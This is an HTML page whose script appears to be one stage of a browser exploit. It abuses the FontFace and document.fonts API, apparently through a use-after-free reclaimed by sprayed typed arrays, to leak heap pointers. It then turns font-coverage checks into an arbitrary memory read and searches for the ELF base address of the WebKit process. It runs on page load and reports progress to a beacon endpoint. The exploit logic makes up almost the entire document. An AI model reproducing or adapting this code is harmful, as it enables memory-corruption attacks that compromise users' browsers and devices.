<!DOCTYPE html><html><head><meta charset="utf-8"><title>walk6</title></head>
<body>
<div id="V" style="position:sticky;top:0;z-index:9;font:700 14px monospace;padding:.4rem;background:#fff4d6;color:#5a4300;border-bottom:2px solid #d7b34a">walk6</div>
<pre id="O">walk6 — ELF base hunt</pre>
<script>
'use strict';
var O=document.getElementById('O');
function b(m){try{O.textContent+='\n'+m;}catch(e){}}
function bs(t){try{var x=new XMLHttpRequest();x.open('GET','/beacon/W6-'+encodeURIComponent(t),false);x.send(null);}catch(e){}}
function vd(ok,t){var v=document.getElementById('V');v.style.background=ok?'#e3f5e6':'#fde2e1';v.style.color=ok?'#0f5a20':'#8c1010';v.textContent=t;}
bs('BOOT');

var K=16,PW=60,SZ=192,fired=false,faces=null,AT=0;
function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
function hex(x){return '0x'+x.toString(16);}

function start(){
  AT++;if(AT>1)return;
  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){return;}
  try{document.fonts.add(vf);}catch(e){}
  try{void vf.loaded;}catch(e){}
  var fs=document.createElement('style');
  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
  document.head.appendChild(fs);
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
    if(fired)return undefined;fired=true;
    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
    try{document.body.offsetHeight;}catch(e){}
    window.__sp=[];
    for(var k=0;k<K;k++){
      var w=new Uint8Array(new ArrayBuffer(SZ));
      w[0x82]=3;w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
      window.__sp.push(w);
    }
    return undefined;
  },set:function(){}});
  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;setTimeout(phase,PW);},function(){});
}

function phase(){
  var bufs=[],L1=0n,L2=0n;
  for(var i=0;i<window.__sp.length;i++){
    var a=le(window.__sp[i],0x58),c=le(window.__sp[i],0x68);
    if(a>0x1000000000n){bufs.push([window.__sp[i],c]);if(L1===0n){L1=a;L2=c;}}
  }
  bs('L1-'+hex(L1)+'-L2-'+hex(L2));
  if(!bufs.length||L2===0n){bs('NOLEAK');vd(false,'NOLEAK');return;}
  var l2hi=Number((L2>>32n)&0xFFFFFFFFn);

  for(var ib=0;ib<bufs.length;ib++){
    var vb=bufs[ib][0];
    vb[0]=2;
    vb[8]=Number(bufs[ib][1]&0xFFn);vb[9]=Number((bufs[ib][1]>>8n)&0xFFn);
    vb[10]=Number((bufs[ib][1]>>16n)&0xFFn);vb[11]=Number((bufs[ib][1]>>24n)&0xFFn);
    vb[12]=Number((bufs[ib][1]>>32n)&0xFFn);vb[13]=0;vb[14]=0;vb[15]=0;
    vb[0x10]=0;vb[0x82]=0;
  }
  for(var ip=0;ip<bufs.length;ip++){
    bufs[ip][0][0x38]=0x21;bufs[ip][0][0x39]=0x43;bufs[ip][0][0x3A]=0;bufs[ip][0][0x3B]=0;
    bufs[ip][0][0x3C]=0x21;bufs[ip][0][0x3D]=0x43;bufs[ip][0][0x3E]=0;bufs[ip][0][0x3F]=0;
  }

  setTimeout(function(){
    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
    setTimeout(function(){
      for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
      setTimeout(function(){
        var fam=null;
        for(var q=0;q<faces.length;q++){
          var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){}
          if(r===false){fam='zz'+q;break;}
        }
        if(!fam){bs('NOTIN');vd(false,'NOTIN');return;}
        for(var is2=0;is2<bufs.length;is2++){bufs[is2][0][0x28]=1;bufs[is2][0][0x2C]=1;}

        var n3=0,BUDGET=120;
        var chkS='1em '+fam;
        var mkCP=String.fromCodePoint(0x4321);
        var cp0=String.fromCodePoint(0);
        var cpHi=(l2hi>0&&l2hi<=0x10FFFF)?String.fromCodePoint(l2hi):null;

        function chk(cc){try{return document.fonts.check(chkS,cc);}catch(e){return null;}}
        function setA(addr){
          for(var ir=0;ir<bufs.length;ir++){
            var u=bufs[ir][0];
            u[0x20]=Number(addr&0xFFn);u[0x21]=Number((addr>>8n)&0xFFn);
            u[0x22]=Number((addr>>16n)&0xFFn);u[0x23]=Number((addr>>24n)&0xFFn);
            u[0x24]=Number((addr>>32n)&0xFFn);u[0x25]=0;u[0x26]=0;u[0x27]=0;
          }
        }

        var STEP=0xC0n;
        var raw=L1-0x80000n,rem=((raw%STEP)+STEP)%STEP;
        var base=raw-rem+0x80n;if(base>raw)base-=STEP;
        var hitAddr=0n,selfAddr=0n;
        for(var idx=0;idx<80;idx++){
          if(n3>=BUDGET)break;
          var ca=base+BigInt(idx)*STEP;
          setA(ca+0x38n);n3++;
          if(chk(mkCP)===true){hitAddr=ca;break;}
        }
        if(hitAddr!==0n){
          for(var d=-20;d<=20;d++){
            if(n3>=BUDGET)break;
            var ca2=hitAddr+BigInt(d)*STEP;
            setA(ca2+0x6Cn);n3++;
            if(chk(cp0)===false){
              if(cpHi){n3++;if(chk(cpHi)===true){selfAddr=ca2;break;}}
              else{selfAddr=ca2;break;}
            }
          }
        }
        if(selfAddr===0n){bs('NOSELF');vd(false,'NOSELF');return;}
        bs('SELF-'+hex(selfAddr)+'-n3='+n3);

        var rl=bufs[0][0];
        var P3=le(rl,0x18);

        function bsearch(aimAddr){
          setA(aimAddr);
          var lo=0,hi=0x10FFFF;
          for(var s=0;s<21;s++){
            n3++;if(n3>BUDGET)return -1;
            var mid=lo+((hi-lo)>>1);
            var r=chk(String.fromCodePoint(mid));
            if(r===true)hi=mid;else lo=mid+1;
          }
          return lo;
        }

        // 1. Read text pointer lower 32 bits
        var r0=bsearch(P3);
        var textPtr=0x100000000n+BigInt(r0);
        bs('TXT-'+hex(textPtr));

        // 2. Hypothesis: RVA = textPtr & 0xFFFFFFFF (lower 32 bits)
        //    base = textPtr - rva = 0x100000000
        //    But also try: base = textPtr with low 12/16 bits zeroed
        var rva=textPtr&0xFFFFFFFFn;  // e.g. 0x1A201
        var cand0=textPtr-rva;         // 0x100000000 hypothesis
        var cand1=textPtr&(~0xFFFn);   // page-align down
        var cand2=textPtr&(~0xFFFFn);  // 64KB-align down

        // 3. ELF check: read u32 at base+0x36
        // For 64-bit ELF: e_phentsize=0x38(56), e_phnum=varies
        // u32@(base+0x36) = 0x0038 | (e_phnum<<16) if e_shoff doesn't interfere
        // Actually offset 0x36 = e_phentsize(u16) + e_phnum(u16)
        // from = phentsize | phnum<<16, to = u32@(base+0x3A) = shentsize | shnum<<16
        // Need from <= to for the read to work

        // Also try offset 0x04: EI_CLASS=2(64bit), EI_DATA=1(LE), EI_VERSION=1, EI_OSABI=9(FreeBSD)
        // u32@(base+0x04) = 0x02 | 0x01<<8 | 0x01<<16 | 0x09<<24 = 0x09010102
        // 0x09010102 = 150995202 > 0x10FFFF → all false. Can't read.

        // Try offset 0x12: e_machine(u16) + e_version(u32)
        // x86-64: e_machine=0x3E(62), e_version=1
        // u32@(base+0x12) = 0x3E | 0x00<<8 | 0x01<<16 | 0x00<<24 = 0x1003E = 65598
        // u32@(base+0x16) = bytes of e_entry
        // Need to >= 65598 for readable. e_entry high bytes likely > 0.

        // Try PT_LOAD at base+0x78 (2nd phdr): type=1, flags=5(RX)
        // u32@(base+0x78) = 1, u32@(base+0x7C) = 5. from=1,to=5. Readable! Returns 1.
        // But value=1 is not distinctive enough.

        // Best bet: e_machine check at base+0x12. 0x1003E = 65598 is distinctive.
        // If to >= from: readable. e_version(u32)=1 at offset 0x14.
        // u32@(base+0x16) = e_entry bytes 2-5. For FreeBSD process, e_entry is non-zero.
        // from=0x1003E, to=u32@(base+0x16). Need to >= 0x1003E.
        // e_entry for webkit is probably > 0x10000, so bytes 2-5 would be large. Might work!

        var results=[];

        // Test candidate 0: base = 0x100000000 (textPtr - low32)
        var e0=bsearch(cand0+0x12n);
        results.push('c0_em='+e0.toString(16));

        // Test candidate 0: PT_LOAD at +0x78
        var e0b=bsearch(cand0+0x78n);
        results.push('c0_pt='+e0b.toString(16));

        // Test candidate 0: phdr at +0x36
        var e0c=bsearch(cand0+0x36n);
        results.push('c0_ph='+e0c.toString(16));

        // Test candidate 1: page-aligned
        if(cand1!==cand0){
          var e1=bsearch(cand1+0x12n);
          results.push('c1_em='+e1.toString(16));
        } else {
          results.push('c1=same');
        }

        // Test candidate 2: 64KB-aligned
        if(cand2!==cand0&&cand2!==cand1){
          var e2=bsearch(cand2+0x12n);
          results.push('c2_em='+e2.toString(16));
        } else {
          results.push('c2=same');
        }

        bs('ELF-'+results.join(','));
        b(results.join('\n'));
        bs('DONE-n3='+n3);
        vd(true,'walk6 n3='+n3+' txt='+hex(textPtr));
      },40);
    },30);
  },40);
}

if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(start,0);
else document.addEventListener('DOMContentLoaded',start);
</script></body></html>
